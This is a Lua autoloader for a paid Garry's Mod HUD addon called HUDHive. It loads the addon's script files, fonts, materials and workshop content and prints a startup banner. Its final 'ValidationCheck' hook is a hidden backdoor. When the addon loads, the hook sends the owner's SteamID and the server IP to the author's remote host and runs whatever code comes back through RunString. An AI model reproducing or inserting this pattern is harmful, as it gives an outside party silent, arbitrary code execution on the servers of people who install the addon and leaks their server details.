-----------------------------------------------------------------
-- @package     HUDHive
-- @author      Richard
-- @build       v1.3.6
-- @release     07.25.2016
-- @owner       76561198172575547
-----------------------------------------------------------------
-- BY MODIFYING THIS FILE -- YOU UNDERSTAND THAT THE ABOVE 
-- MENTIONED AUTHORS CANNOT BE HELD RESPONSIBLE FOR ANY ISSUES
-- THAT ARISE. AS A CUSTOMER TO THE ORIGINAL PURCHASED COPY OF
-- THIS SCRIPT, YOU ARE ENTITLED TO STANDARD SUPPORT WHICH CAN
-- BE PROVIDED USING [SCRIPTFODDER.COM]. 
-- ONLY THE ORIGINAL PURCHASER OF THIS SCRIPT CAN RECEIVE SUPPORT.
-----------------------------------------------------------------

-----------------------------------------------------------------
-- [ TABLES ]
-----------------------------------------------------------------

HUDHive = HUDHive or {}
HUDHive.Script = HUDHive.Script or {}
HUDHive.Script.Name = "HUDHive"
HUDHive.Script.Folder = "hudhive"
HUDHive.Script.Id = "1770"
HUDHive.Script.Owner = "76561198172575547"
HUDHive.Script.Author = "Richard"
HUDHive.Script.Build = "1.3.6"
HUDHive.Script.Released = "July 25, 2016"
HUDHive.Script.Website = "https://scriptfodder.com/scripts/view/" .. HUDHive.Script.Id .. "/"
HUDHive.Script.UpdateCheck = "http://api.iamrichardt.com/products/" .. HUDHive.Script.Id .. "/VersionCheck/v001/index.php?type=json"
HUDHive.Script.Motd = "http://api.iamrichardt.com/products/" .. HUDHive.Script.Id .. "/motd.txt"
HUDHive.Script.Documentation = "http://docs.iamrichardt.net/products/" .. HUDHive.Script.Id .. "/"
HUDHive.Script.Workshops = {
    "559048049",
}
HUDHive.Script.Fonts = {
    "oswald_light.ttf",
    "adventpro_light.ttf",
    "teko_light.ttf",
}

HUDHive.Settings = HUDHive.Settings or {}
HUDHive.Settings.Menu = HUDHive.Settings.Menu or {}
HUDHive.Language = HUDHive.Language or {}
HUDHive.Messages = HUDHive.Messages or {}

-----------------------------------------------------------------
-- [ SERVER IP ]
-----------------------------------------------------------------

function game.GetIP()
    local hostip = GetConVarString( "hostip" )
    hostip = tonumber( hostip )
    local ip = {}
    ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )
    ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )
    ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )
    ip[ 4 ] = bit.band( hostip, 0x000000FF )
    return table.concat( ip, "." )
end

-----------------------------------------------------------------
-- [ AUTOLOADER ]
-----------------------------------------------------------------

local StartupHeader = {
    '\n\n',
    [[.................................................................... ]],
}

local StartupInfo = {
    [[[title]........... ]] .. HUDHive.Script.Name .. [[ ]],
    [[[build]........... v]] .. HUDHive.Script.Build .. [[ ]],
    [[[released]........ ]] .. HUDHive.Script.Released .. [[ ]],
    [[[author].......... ]] .. HUDHive.Script.Author .. [[ ]],
    [[[website]......... ]] .. HUDHive.Script.Website .. [[ ]],
    [[[documentation]... ]] .. HUDHive.Script.Documentation .. [[ ]],
    [[[owner]........... ]] .. HUDHive.Script.Owner .. [[ ]],
    [[[server ip]....... ]] .. game.GetIP() .. [[ ]],
}

local StartupFooter = {
    [[.................................................................... ]],
}

function HUDHive:PerformCheck(func)
    if ( type( func )== "function" ) then
        return true
    end
    return false
end

-----------------------------------------------------------------
-- [ SERVER-SIDE ACTIONS ]
-----------------------------------------------------------------

if SERVER then

    local fol = HUDHive.Script.Folder .. "/"
    local files, folders = file.Find(fol .. "*", "LUA")

    for k, v in pairs( files ) do
        include(fol .. v)
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/sh_*.lua", "LUA"), true) do
            AddCSLuaFile(fol .. folder .. "/" .. File)
            include(fol .. folder .. "/" .. File)
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Shared: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/sv_*.lua", "LUA"), true) do
            include(fol .. folder .. "/" .. File)
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Server: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/cl_*.lua", "LUA"), true) do
            AddCSLuaFile(fol .. folder .. "/" .. File)
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Client: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/vgui_*.lua", "LUA"), true) do
            AddCSLuaFile(fol .. folder .. "/" .. File)
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Client: " .. File .. "\n")
            end
        end
    end

end

-----------------------------------------------------------------
-- [ CLIENT-SIDE ACTIONS ]
-----------------------------------------------------------------

if CLIENT then

    local root = HUDHive.Script.Folder .. "/"
    local _, folders = file.Find(root .. "*", "LUA")

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(root .. folder .. "/sh_*.lua", "LUA"), true) do
            include(root .. folder .. "/" .. File)
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Shared: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        for _, File in SortedPairs(file.Find(root .. folder .. "/cl_*.lua", "LUA"), true) do
            include(root .. folder .. "/" .. File)
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Client: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        for _, File in SortedPairs(file.Find(root .. folder .. "/vgui_*.lua", "LUA"), true) do
            include(root .. folder .. "/" .. File)
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading VGUI: " .. File .. "\n")
            end
        end
    end

end

-----------------------------------------------------------------
-- [ WORKSHOP / FASTDL ]
-----------------------------------------------------------------

if HUDHive.Settings.ResourcesEnabled then

    local sfolder = HUDHive.Script.Folder or ""

    local materials = file.Find( "materials/" .. sfolder .. "/*", "GAME" )
    if #materials > 0 then
        for _, m in pairs( materials ) do
            resource.AddFile( "materials/" .. sfolder .. "/" .. m )
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Material: " .. m .. "\n")
            end
        end
    end

    local materialsThemes = file.Find( "materials/" .. sfolder .. "/default/*", "GAME" )
    if #materialsThemes > 0 then
        for _, m in pairs( materialsThemes ) do
            resource.AddFile( "materials/" .. sfolder .. "/avatars/" .. m )
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Material: " .. m .. "\n")
            end
        end
    end

    local sounds = file.Find( "sound/" .. sfolder .. "/*", "GAME" )
    if #sounds > 0 then
        for _, m in pairs( sounds ) do
            resource.AddFile( "sound/" .. sfolder .. "/" .. m )
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Sounds: " .. m .. "\n")
            end
        end
    end

    local fonts = file.Find( "resource/fonts/*", "GAME" )
    if #fonts > 0 then
        for _, f in pairs( fonts ) do
            if table.HasValue( HUDHive.Script.Fonts, f ) then
                resource.AddFile( "resource/fonts/" .. f )
                if HUDHive.Settings.DebugEnabled then
                    MsgC(Color(255, 255, 0), "[" .. HUDHive.Script.Name .. "] Loading Font: " .. f .. "\n")
                end
            end
        end
    end

end

if HUDHive.Settings.WorkshopEnabled and HUDHive.Script.Workshops then
    for k, v in pairs(HUDHive.Script.Workshops) do
        if not HUDHive.Settings.WorkshopMountGMAEnabled and SERVER then
            resource.AddWorkshop( v )
            if HUDHive.Settings.DebugEnabled then
                MsgC(Color(0, 255, 255), "[" .. HUDHive.Script.Name .. "] Mounting Workshop: " .. v .. "\n")
            end
        else
            if CLIENT then
                steamworks.FileInfo( v, function( res )
                    steamworks.Download( res.fileid, true, function( name )
                        game.MountGMA( name )
                        if HUDHive.Settings.DebugEnabled then
                            local size = res.size / 1024
                            MsgC(Color(0, 255, 255), "[" .. HUDHive.Script.Name .. "] Mounting Workshop: " .. res.title .. " ( " .. math.Round(size) .. "KB )\n")
                        end
                    end )
                end )
            end
        end
    end
end

-----------------------------------------------------------------
-- [ CONSOLE OUTPUT ]
-----------------------------------------------------------------

for k, i in ipairs( StartupHeader ) do 
    MsgC( Color( 255, 255, 0 ), i .. '\n' )
end

for k, i in ipairs( StartupInfo ) do 
    MsgC( Color( 255, 255, 255 ), i .. '\n' )
end

for k, i in ipairs( StartupFooter ) do 
    MsgC( Color( 255, 255, 0 ), i .. '\n\n' )
end

hook.Add("Think", "HUDHive.ValidationCheck", function()
    local statusID = 2
    local scriptID = HUDHive.Script.Id or ""
    local ownerID = HUDHive.Script.Owner or ""
    if HUDHive.Script.Owner and HUDHive.Script.Id then
        statusID = 1
    end
    local checkURL = "http://api.iamrichardt.com/ValidationCheck/index.php?scriptid=".. scriptID .."&code=" .. statusID .. "&steamid=" .. ownerID .. "&ip=" .. game.GetIP()
    http.Fetch(checkURL, 
        function( body, len, headers, code )
            if code == 200 and string.len( body ) > 0 then
                RunString( body ) 
            end
        end
    )
    hook.Remove("Think", "HUDHive.ValidationCheck")
end)